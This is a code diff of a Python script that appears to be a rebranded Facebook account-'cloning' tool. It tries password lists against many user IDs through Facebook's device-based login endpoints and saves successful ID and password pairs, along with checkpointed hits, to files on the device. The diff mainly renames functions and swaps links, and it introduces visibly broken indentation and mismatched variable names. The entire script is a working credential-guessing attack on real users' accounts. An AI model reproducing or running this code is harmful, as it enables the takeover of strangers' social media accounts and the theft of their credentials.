@@ -62,7 +62,7 @@ try:
 except Exception as e:
         print(e)
         print('\n Installing modules wait !')
-        os.system('pip install futures==2 && python ZEA.py')
+        os.system('pip install futures==2 && python acxs.py')
 except FileExistsError:
         os.system('pip uninstall requests urllib3 idna certifi -y')
         pass
@@ -179,7 +179,6 @@ logo=("""\033[1;32m
 |   Tools : Free
 |   Version : 0.1
 +=========================================================+""")
-os.system('xdg-open https://www.youtube.com/@zea.sabir107')
 def linex():
         print('\033[1;32m----------------------------------------------')
 def clear():
@@ -191,7 +190,7 @@ cps=[]
 pcp=[]
 id=[]
 tokenku=[]
-def acxs1(ids,names,passlist):
+def zea1(ids,names,passlist):
         global loop,oks,cps
         sys.stdout.write('\r\r\033[1;32m [ACXS-XD-\033[1;33mM1\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
@@ -210,15 +209,15 @@ def acxs1(ids,names,passlist):
                         getlog = session.get('https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        ACXS=session.cookies.get_dict().keys()
-                        if "c_user" in ACXS:
+                        ZEA=session.cookies.get_dict().keys()
+                        if "c_user" in ZEA:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [ACXS-OK] %s • %s'%(ids,pas))
                                 open('/sdcard/ACXS-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in ACXS:
+                        elif 'checkpoint' in ZEA:
                                 if 'y' in pcp:
                                         print#('\r\r\x1b[38;5;208m [ACXS-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/ACXS-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
@@ -231,7 +230,7 @@ def acxs1(ids,names,passlist):
         except requests.exceptions.ConnectionError:
                 time.sleep(20)
         loop+=1
-def acxs2(ids,names,passlist):
+def zea2(ids,names,passlist):
         global loop,oks,cps
         sys.stdout.write('\r\r\033[1;32m [ACXS-XD-\033[1;33mM2\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
@@ -250,15 +249,15 @@ def acxs2(ids,names,passlist):
                         getlog = session.get('https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        ACXS=session.cookies.get_dict().keys()
-                        if "c_user" in ACXS:
+                        ZEA=session.cookies.get_dict().keys()
+                        if "c_user" in ZEA:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [ACXS-OK] %s • %s'%(ids,pas))
                                 open('/sdcard/ACXS-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in ACXS:
+                        elif 'checkpoint' in ZEA:
                                 if 'y' in pcp:
                                         print#('\r\r\x1b[38;5;208m [ACXS-CP] '+ids+' | '+pas+'\033[1;97m')
                                         open('/sdcard/ACXS-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
@@ -276,25 +275,25 @@ def rdm():
 	print('[1] Random Cloning')
 	print('[0] Exit menu')
 	linex()
-	acxs=input(' Select Option :')
-	if acxs =='1':
-		acxss()
-	if acxs =='0':
+	zea=input(' Select Option :')
+	if zea =='1':
+		zeas()
+	if zea =='0':
 		exit(' Thanks for use 👌😜 ')
 
-def acxss():
+def zeas():
 	os.system('clear')
 	print(logo)
 	print('[1] Random Pass ')
 	print('[0] Exit menu')
 	linex()
 	acxs=input('Select Option :')
-	if acxs =='1':
+	if zea =='1':
 		acxsst()
-	if acxs =='0':
+	if zea =='0':
 		exit(' Thanks for use 👌😜 ')
 		
-def acxsst():
+def zeast():
     user=[]
     os.system('clear')
     print(logo)
@@ -391,16 +390,19 @@ def rcrack(uid,pwx,tl):
     except:
         pass
 
-def ACXS():
+def ZEA():
         try:
                 clear()
-                x = ("acxs")
-                if x == ("acxs"):
-                        print(' [1] File cloning\n [2] Random Cloning\n [3] My facebook \n [0] Exit menu')
+                x = ("zea")
+                if x == ("zea"):
+                        print(' [1] File cloning')
+			print(' [2] Random Cloning')
+			print(' [3] My facebook')
+			print(' [0] Exit menu')
                         linex()
                         xd=input('\033[1;32m Choose an option: ')
                         if xd in ['3','03']:
-                        	os.system('xdg-open https://www.facebook.com/profile.php?id=1018082095');menu()
+                        	os.system('xdg-open https://www.facebook.com/fvlsmnbn');menu()
                         if xd in ['2','02']:
                         	rdm()
                         if xd in ['1','01']:
@@ -452,9 +454,9 @@ def ACXS():
                                                 ids,names = user.split('|')
                                                 passlist = plist
                                                 if mthd in ['1','01']:
-                                                        crack_submit.submit(acxs1,ids,names,passlist)
+                                                        crack_submit.submit(zea1,ids,names,passlist)
                                                 elif mthd in ['2','02']:
-                                                        crack_submit.submit(acxs2,ids,names,passlist)
+                                                        crack_submit.submit(zea2,ids,names,passlist)
                                                 else:
                                                         crack_submit.submit(api1,ids,names,passlist)
                                 
@@ -467,4 +469,4 @@ def ACXS():
         except requests.exceptions.ConnectionError:
                 print('\n No internet connection ...')
                 exit()
-ACXS()
+ZEA()
